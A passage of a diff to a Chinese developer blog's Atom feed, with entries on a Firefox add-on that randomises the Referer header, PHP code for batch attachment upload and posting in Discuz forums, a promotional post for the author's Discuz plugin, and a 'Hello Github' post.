day!"</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="随机referer-实现"><a href="#随机referer-实现" class="headerlink" title="随机referer 实现"></a>随机referer 实现</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> &#123; ToggleButton &#125; = <span class="built_in">require</span>(<span class="string">'sdk/ui/button/toggle'</span>);</span><br><span class="line"><span class="keyword">var</span> panels = <span class="built_in">require</span>(<span class="string">"sdk/panel"</span>);</span><br><span class="line"><span class="keyword">var</span> self = <span class="built_in">require</span>(<span class="string">"sdk/self"</span>);</span><br><span class="line"><span class="keyword">var</span> prefs = <span class="built_in">require</span>(<span class="string">"sdk/simple-prefs"</span>).prefs;</span><br><span class="line"><span class="keyword">var</span> ss = <span class="built_in">require</span>(<span class="string">"sdk/simple-storage"</span>);</span><br><span class="line"><span class="keyword">var</span> &#123;Cc, Ci&#125; = <span class="built_in">require</span>(<span class="string">"chrome"</span>);</span><br><span class="line"><span class="keyword">var</span> httpRequestObserver =</span><br><span class="line">&#123;</span><br><span class="line">  observe: <span class="function"><span class="keyword">function</span>(<span class="params">subject, topic, data</span>)</span><br><span class="line">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (topic == <span class="string">"http-on-modify-request"</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> httpChannel = subject.QueryInterface(Ci.nsIHttpChannel);</span><br><span class="line">      <span class="keyword">var</span> host= httpChannel.originalURI.host;</span><br><span class="line">      <span class="comment">//判断是否在站点列表中</span></span><br><span class="line">      <span class="keyword">if</span> (ss.storage.site.indexOf(host) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        httpChannel.setRequestHeader(<span class="string">"Referer"</span>, read_referer(), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  get observerService() &#123;</span><br><span class="line">    <span class="keyword">return</span> Cc[<span class="string">"@mozilla.org/observer-service;1"</span>]</span><br><span class="line">    .getService(Ci.nsIObserverService);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//注册监听器</span></span><br><span class="line">  register: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">  </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.observerService.addObserver(<span class="keyword">this</span>, <span class="string">"http-on-modify-request"</span>, <span class="literal">false</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//卸载</span></span><br><span class="line">  unregister: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">  </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.observerService.removeObserver(<span class="keyword">this</span>, <span class="string">"http-on-modify-request"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>1.<a href="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui</a><br>2. <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/port" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/port</a><br>3. <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/tabs" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/tabs</a><br>4. <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/using_port" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/using_port</a><br>5. <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/simple-storage" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/simple-storage</a><br>6. <a href="https://developer.mozilla.org/en-US/docs/Setting_HTTP_request_headers" target="_blank" rel="external">https://developer.mozilla.org/en-US/docs/Setting_HTTP_request_headers</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最新版本的Firefox 终于舍弃了鸡肋的xul布局,可以使用原生的html用作ui交互,插件界面中可以引入 bootstrap jQuery等库,大大简便了布局和高度自定义化,本文以一个随机自定义referer 实例来记录jpm 高级ui交互编程。&lt;/p&gt;
+&lt;h3 id=&quot;界面布局&quot;&gt;&lt;a href=&quot;#界面布局&quot; class=&quot;headerlink&quot; title=&quot;界面布局&quot;&gt;&lt;/a&gt;界面布局&lt;/h3&gt;&lt;h4 id=&quot;ui-控件&quot;&gt;&lt;a href=&quot;#ui-控件&quot; class=&quot;headerlink&quot; title=&quot;ui 控件&quot;&gt;&lt;/a&gt;ui 控件&lt;/h4&gt;&lt;p&gt;官方api中提供的ui控件如下&lt;br&gt;1. ActionButton   动作按钮&lt;br&gt;2. ToggleButton   切换按钮&lt;br&gt;3. Frame           框架&lt;br&gt;4. Toolbar        工具栏&lt;br&gt;5. Sidebar        网站边栏&lt;br&gt;具体可以参考官方文档 &lt;a href=&quot;https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui&quot;&gt;https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui&lt;/a&gt;&lt;br&gt;&lt;code&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Firefox" scheme="yaseng.org/categories/Firefox/"/>
+    
+      <category term="西部大开发" scheme="yaseng.org/categories/Firefox/%E8%A5%BF%E9%83%A8%E5%A4%A7%E5%BC%80%E5%8F%91/"/>
+    
+    
+      <category term="Firefox" scheme="yaseng.org/tags/Firefox/"/>
+    
+      <category term="firefox 扩展开发笔记" scheme="yaseng.org/tags/firefox-%E6%89%A9%E5%B1%95%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="firefox扩展" scheme="yaseng.org/tags/firefox%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="firefox插件" scheme="yaseng.org/tags/firefox%E6%8F%92%E4%BB%B6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>discuz 模拟批量上传附件发帖 </title>
+    <link href="yaseng.org/discuz-attachment-and-posting.html"/>
+    <id>yaseng.org/discuz-attachment-and-posting.html</id>
+    <published>2016-03-31T03:21:58.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>对于很多用discuz做资源下载站来说,一个个上传附件,发帖是很繁琐的过程。如果需要批量上传附件发帖,就需要去模拟discuz 上传附件的流程。<br>插件地址<a href="http://addon.discuz.com/?@uauc_auto_thread.plugin" title=" http://addon.discuz.com/?@uauc_auto_thread.plugin" target="_blank" rel="external"> http://addon.discuz.com/?@uauc_auto_thread.plugin</a></p>
+<h3 id="模拟上传"><a href="#模拟上传" class="headerlink" title="模拟上传"></a>模拟上传</h3><h4 id="discuz-附件逻辑"><a href="#discuz-附件逻辑" class="headerlink" title="discuz 附件逻辑"></a>discuz 附件逻辑</h4><p>dz附件储存在一个附件索引表pre_forum_attachment 和一系列分表pre_forum_attachment_0-9 里面,具体是哪个分表工具帖子tid而定。<br>参考discuz 内部实现可以精简为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$tableid=substr($tid, <span class="number">-1</span>);   <span class="comment">//tableid 为附件分表数字 帖子id</span></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h4 id="附件模拟上传函数"><a href="#附件模拟上传函数" class="headerlink" title="附件模拟上传函数"></a>附件模拟上传函数</h4><p>根据以上分析,封装为一个单独的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line">*<span class="doctag">@desc</span>     添加附件函数,具体操作是模拟discuz正常上传附件功能,返回一个附件id</span><br><span class="line">*<span class="doctag">@param</span>    $file  服务器上面的文件路径</span><br><span class="line">*<span class="doctag">@param</span>    $tid   帖子id</span><br><span class="line">*<span class="doctag">@param</span>    $pid   post_id</span><br><span class="line">*<span class="doctag">@param</span>    $dirs  文件夹</span><br><span class="line">*<span class="doctag">@param</span>    $attachment_score   积分</span><br><span class="line">*<span class="doctag">@return</span>   返回附件id</span><br><span class="line">**/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add_attachment</span><span class="params">($file,$tid,$pid,$dirs,$attachment_score)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	$file_path=$dirs.<span class="string">'\\'</span>.$file;</span><br><span class="line">	<span class="comment">//后缀</span></span><br><span class="line">	$attachment=<span class="string">'/'</span>.md5(rand_str()).<span class="string">".attach"</span>;</span><br><span class="line">	$new_file_path=<span class="string">'./data/attachment/forum'</span>.$attachment;</span><br><span class="line">	$uid=<span class="number">1</span>; <span class="comment">//暂时设置为管理员</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(copy($file_path,$new_file_path))&#123;</span><br><span class="line"></span><br><span class="line">		$tableid=substr($tid, <span class="number">-1</span>); <span class="comment">// 分表处理逻辑</span></span><br><span class="line"></span><br><span class="line">		$attach=<span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'tid'</span> =&gt; $tid ,</span><br><span class="line">		<span class="string">'pid'</span> =&gt; $pid,</span><br><span class="line">		<span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">		<span class="string">'tableid'</span> =&gt; $tableid,  </span><br><span class="line"></span><br><span class="line">		);</span><br><span class="line"></span><br><span class="line">		$aid=DB::insert(<span class="string">'forum_attachment'</span>,$attach,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($attachment_score==<span class="number">0</span>)&#123;</span><br><span class="line">		$attachment_info=<span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">'aid'</span>        =&gt; $aid,</span><br><span class="line">		<span class="string">'uid'</span>        =&gt; $uid,  <span class="comment">//发布者id</span></span><br><span class="line">		<span class="string">'tid'</span>        =&gt; $tid,</span><br><span class="line">		<span class="string">'pid'</span>        =&gt; $pid,</span><br><span class="line">		<span class="string">'dateline'</span>   =&gt; time(),</span><br><span class="line">		<span class="string">'filename'</span>   =&gt; $file,  <span class="comment">//文件名称</span></span><br><span class="line">		<span class="string">'filesize'</span>   =&gt; filesize($new_file_path),</span><br><span class="line">		<span class="string">'attachment'</span> =&gt; $attachment ,</span><br><span class="line"></span><br><span class="line">		);</span><br><span class="line"></span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					$attachment_info=<span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">'aid'</span>        =&gt; $aid,</span><br><span class="line">		<span class="string">'uid'</span>        =&gt; $uid,  <span class="comment">//发布者id</span></span><br><span class="line">		<span class="string">'tid'</span>        =&gt; $tid,</span><br><span class="line">		<span class="string">'pid'</span>        =&gt; $pid,</span><br><span class="line">		<span class="string">'dateline'</span>   =&gt; time(),</span><br><span class="line">		<span class="string">'filename'</span>   =&gt; $file,  <span class="comment">//文件名称</span></span><br><span class="line">		<span class="string">'filesize'</span>   =&gt; filesize($new_file_path),</span><br><span class="line">		<span class="string">'attachment'</span> =&gt; $attachment ,</span><br><span class="line">    <span class="string">'price'</span> =&gt; $attachment_score ,<span class="comment">//附件积分</span></span><br><span class="line"></span><br><span class="line">		);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		DB::insert(<span class="string">'forum_attachment_'</span>.$tableid,$attachment_info,<span class="keyword">true</span>);</span><br><span class="line">			<span class="keyword">return</span>  $aid;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="批量发帖"><a href="#批量发帖" class="headerlink" title="批量发帖"></a>批量发帖</h3><p>实现模拟批量上传附件之后,再来模拟批量发帖。代码参考discuz 内核实现。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$discuz_uid = <span class="number">1</span>;  <span class="comment">// uid</span></span><br><span class="line">$discuz_user = <span class="string">'admin'</span>; <span class="comment">//用户名</span></span><br><span class="line">$fid = intval($_POST[<span class="string">'fid'</span>]); <span class="comment">//版块id</span></span><br><span class="line">$typeid = <span class="number">0</span>;</span><br><span class="line">$subject = substr(strrchr($dirs, <span class="string">'\\'</span>),<span class="number">1</span>);   <span class="comment">// 帖子标题</span></span><br><span class="line">$message = $text_content.$word_content.$imgpng_content.$imgjpg_content;   <span class="comment">//</span></span><br><span class="line">$timestamp = $_G[<span class="string">'timestamp'</span>];</span><br><span class="line">$onlineip = $_G[<span class="string">'clientip'</span>];</span><br><span class="line">$ismobile = <span class="number">4</span>; <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($arr_attachment_file==<span class="keyword">NULL</span>)&#123;</span><br><span class="line">	$newthread = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'fid'</span> =&gt; $fid,</span><br><span class="line">	<span class="string">'posttableid'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">	<span class="string">'typeid'</span> =&gt; $typeid,</span><br><span class="line">	<span class="string">'readperm'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">	<span class="string">'price'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">	<span class="string">'author'</span> =&gt; $discuz_user,</span><br><span class="line">	<span class="string">'authorid'</span> =&gt; $discuz_uid,</span><br><span class="line">	<span class="string">'subject'</span> =&gt; $subject,</span><br><span class="line">	<span class="string">'dateline'</span> =&gt; $timestamp,</span><br><span class="line">	<span class="string">'lastpost'</span> =&gt; $timestamp,</span><br><span class="line">	<span class="string">'lastposter'</span> =&gt; $discuz_user</span><br><span class="line">	);</span><br><span class="line">	$tid = C::t(<span class="string">'forum_thread'</span>)-&gt;insert($newthread, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">	$subject = addslashes($subject);</span><br><span class="line">	$message = addslashes($message);</span><br><span class="line">	$pid = insertpost(<span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'fid'</span> =&gt; $fid,</span><br><span class="line">	<span class="string">'tid'</span> =&gt; $tid,</span><br><span class="line">	<span class="string">'first'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">	<span class="string">'author'</span> =&gt; $discuz_user,</span><br><span class="line">	<span class="string">'authorid'</span> =&gt; $discuz_uid,</span><br><span class="line">	<span class="string">'subject'</span> =&gt; $subject,</span><br><span class="line">	<span class="string">'dateline'</span> =&gt; $timestamp,</span><br><span class="line">	<span class="string">'message'</span> =&gt; $message,</span><br><span class="line">	<span class="string">'useip'</span> =&gt; $_G[<span class="string">'clientip'</span>]</span><br><span class="line">	));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$newthread = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'fid'</span> =&gt; $fid,</span><br><span class="line">	<span class="string">'posttableid'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">	<span class="string">'typeid'</span> =&gt; $typeid,</span><br><span class="line">	<span class="string">'readperm'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">	<span class="string">'price'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">	<span class="string">'author'</span> =&gt; $discuz_user,</span><br><span class="line">	<span class="string">'authorid'</span> =&gt; $discuz_uid,</span><br><span class="line">	<span class="string">'subject'</span> =&gt; $subject,</span><br><span class="line">	<span class="string">'dateline'</span> =&gt; $timestamp,</span><br><span class="line">	<span class="string">'lastpost'</span> =&gt; $timestamp,</span><br><span class="line">	<span class="string">'attachment'</span>=&gt;<span class="string">'1'</span>,</span><br><span class="line">	<span class="string">'lastposter'</span> =&gt; $discuz_user</span><br><span class="line">	);</span><br><span class="line">	$tid = C::t(<span class="string">'forum_thread'</span>)-&gt;insert($newthread, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">	$subject = addslashes($subject);</span><br><span class="line">	$message = addslashes($message);</span><br><span class="line">	$pid = insertpost(<span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'fid'</span> =&gt; $fid,</span><br><span class="line">	<span class="string">'tid'</span> =&gt; $tid,</span><br><span class="line">	<span class="string">'first'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">	<span class="string">'author'</span> =&gt; $discuz_user,</span><br><span class="line">	<span class="string">'authorid'</span> =&gt; $discuz_uid,</span><br><span class="line">	<span class="string">'subject'</span> =&gt; $subject,</span><br><span class="line">	<span class="string">'dateline'</span> =&gt; $timestamp,</span><br><span class="line">	<span class="string">'message'</span> =&gt; $message,</span><br><span class="line">	<span class="string">'attachment'</span>=&gt;<span class="string">'1'</span>,</span><br><span class="line">	<span class="string">'useip'</span> =&gt; $_G[<span class="string">'clientip'</span>]</span><br><span class="line">	));</span><br><span class="line">	<span class="keyword">foreach</span>($arr_attachment_file   <span class="keyword">as</span>   $keyes=&gt; $values )&#123;</span><br><span class="line">		<span class="keyword">foreach</span>($values <span class="keyword">as</span> $file)&#123;</span><br><span class="line">        <span class="comment">//批量添加附件</span></span><br><span class="line">			add_attachment($file,$tid,$pid,$dirs,$attachment_score);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">DB::query(<span class="string">"UPDATE pre_forum_forum SET lastpost='$timestamp', threads=threads+1, posts=posts+1, todayposts=todayposts+1 WHERE fid='$fid'"</span>, <span class="string">'UNBUFFERED'</span>);</span><br><span class="line">DB::query(<span class="string">"UPDATE pre_common_member_count SET threads=threads+1 WHERE uid='$discuz_uid'"</span>, <span class="string">'UNBUFFERED'</span>);</span><br><span class="line">DB::query(<span class="string">"UPDATE pre_common_member_status SET lastpost='$timestamp' WHERE uid='$discuz_uid'"</span>, <span class="string">'UNBUFFERED'</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>茫茫多的文件夹<br><a href="/uploads/2016/03/auto-post-1.png"><img src="/uploads/2016/03/auto-post-1-300x128.png" alt="" title="auto-post-1"></a></p>
+<p>批量发帖之后的列表<br><a href="/uploads/2016/03/auto_thread1.png"><img src="/uploads/2016/03/auto_thread1-300x159.png" alt="" title="auto_thread"></a></p>
+<p>批量上传附件之后的帖子<a href="/uploads/2016/03/auto-post-2.png"><img src="/uploads/2016/03/auto-post-2-300x174.png" alt="" title="auto-post-2"></a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;对于很多用discuz做资源下载站来说,一个个上传附件,发帖是很繁琐的过程。如果需要批量上传附件发帖,就需要去模拟discuz 上传附件的流程。&lt;br&gt;插件地址&lt;a href=&quot;http://addon.discuz.com/?@uauc_auto_thread.plugin&quot; title=&quot; http://addon.discuz.com/?@uauc_auto_thread.plugin&quot;&gt; http://addon.discuz.com/?@uauc_auto_thread.plugin&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;模拟上传&quot;&gt;&lt;a href=&quot;#模拟上传&quot; class=&quot;headerlink&quot; title=&quot;模拟上传&quot;&gt;&lt;/a&gt;模拟上传&lt;/h3&gt;&lt;h4 id=&quot;discuz-附件逻辑&quot;&gt;&lt;a href=&quot;#discuz-附件逻辑&quot; class=&quot;headerlink&quot; title=&quot;discuz 附件逻辑&quot;&gt;&lt;/a&gt;discuz 附件逻辑&lt;/h4&gt;&lt;p&gt;dz附件储存在一个附件索引表pre_forum_attachment 和一系列分表pre_forum_attachment_0-9 里面,具体是哪个分表工具帖子tid而定。&lt;br&gt;参考discuz 内部实现可以精简为&lt;/p&gt;
+&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$tableid=substr($tid, &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);   &lt;span class=&quot;comment&quot;&gt;//tableid 为附件分表数字 帖子id&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+      <category term="discuz" scheme="yaseng.org/categories/discuz/"/>
+    
+      <category term="西部大开发" scheme="yaseng.org/categories/discuz/%E8%A5%BF%E9%83%A8%E5%A4%A7%E5%BC%80%E5%8F%91/"/>
+    
+    
+      <category term="discuz 插件" scheme="yaseng.org/tags/discuz-%E6%8F%92%E4%BB%B6/"/>
+    
+      <category term="discuz" scheme="yaseng.org/tags/discuz/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>discuz 后台批量上传发帖插件 1.0</title>
+    <link href="yaseng.org/discuz-uauc-auto-thread-1-0.html"/>
+    <id>yaseng.org/discuz-uauc-auto-thread-1-0.html</id>
+    <published>2016-03-29T00:19:01.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="插件介绍"><a href="#插件介绍" class="headerlink" title="插件介绍"></a>插件介绍</h3><p>自动发帖插件可以读取服务器上的文件夹和文件进行批量发帖，通过插件设置，可以读取不同类型的文件，并能够把指定的文件，设置为帖子附件或帖子内容。适用于资源站等类型。</p>
+<p><strong>插件地址</strong> <a href="http://addon.discuz.com/?@uauc_auto_thread.plugin" title="http://addon.discuz.com/?@uauc_auto_thread.plugin" target="_blank" rel="external"><strong>http://addon.discuz.com/?@uauc_auto_thread.plugin</strong></a><br><a id="more"></a></p>
+<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><p>使用前，请先在站点全局设置里，把网站地址设置为当前论坛的网址，文件夹请先通过ftp等工具上传至站点服务器上，并设置为多级目录结构，程序将会读取该目录下的文件夹，并以文件夹标题作为帖子标题，该目录下的每一个文件夹对应生成一个帖子，请确保该目录下存在多个文件夹，以便程序读取！word文档读取作为帖子内容，必须在服务器上安装offcie2007，并配置com组件，如有扩展需求或插件使用问题，请联系客服 。</p>
+<h3 id="插件功能"><a href="#插件功能" class="headerlink" title="插件功能"></a>插件功能</h3><p>1:支持自定义文件数量和路径<br>2：支持附件上传和积分设置<br>3：支持文件夹读取和批量发帖</p>
+<h3 id="插件演示"><a href="#插件演示" class="headerlink" title="插件演示"></a>插件演示</h3><p><a href="/uploads/2016/03/auto_thread2.png"><img src="/uploads/2016/03/auto_thread2-300x127.png" alt="" title="auto_thread2"></a></p>
+<p><a href="/uploads/2016/03/auto_thread.png"><img src="/uploads/2016/03/auto_thread-300x159.png" alt="" title="auto_thread"></a></p>
+<h3 id="UaUc技术支持"><a href="#UaUc技术支持" class="headerlink" title="UaUc技术支持"></a>UaUc技术支持</h3><p>UaUcNet专业服务于广大discuz站长，提供插件私人定制，二次开发，模板定制，论坛疑难问题解答，搬家升级等服务！以专业成熟的技术水平，认真负责的工作态度，为您的论坛运营提供最贴心的技术服务！ 详情请联系UaUCNet团队客服 QQ：189333720  。<br><a href="tencent://message/?uin=189333720&amp;Site=http://www.uauc.net&amp;Menu=yes" target="_blank" rel="external"><img src="http://wpa.qq.com/pa?p=2:189333720:42" alt="QQ" title="QQ"></a> </p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;插件介绍&quot;&gt;&lt;a href=&quot;#插件介绍&quot; class=&quot;headerlink&quot; title=&quot;插件介绍&quot;&gt;&lt;/a&gt;插件介绍&lt;/h3&gt;&lt;p&gt;自动发帖插件可以读取服务器上的文件夹和文件进行批量发帖，通过插件设置，可以读取不同类型的文件，并能够把指定的文件，设置为帖子附件或帖子内容。适用于资源站等类型。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;插件地址&lt;/strong&gt; &lt;a href=&quot;http://addon.discuz.com/?@uauc_auto_thread.plugin&quot; title=&quot;http://addon.discuz.com/?@uauc_auto_thread.plugin&quot;&gt;&lt;strong&gt;http://addon.discuz.com/?@uauc_auto_thread.plugin&lt;/strong&gt;&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="原创作品" scheme="yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
+    
+    
+      <category term="discuz 插件" scheme="yaseng.org/tags/discuz-%E6%8F%92%E4%BB%B6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hello Github</title>
+    <link href="yaseng.org/hello-github.html"/>
+    <id>yaseng.org/hello-github.html</id>
+    <published>2016-03-17T06:30:42.000Z</published>
+    <updated>2016-04-17T10:51:37.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>Hello Github</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Hello Github&lt;/p&gt;
+
+    
+    </summary>
+    
+    
+  </entry>
+  
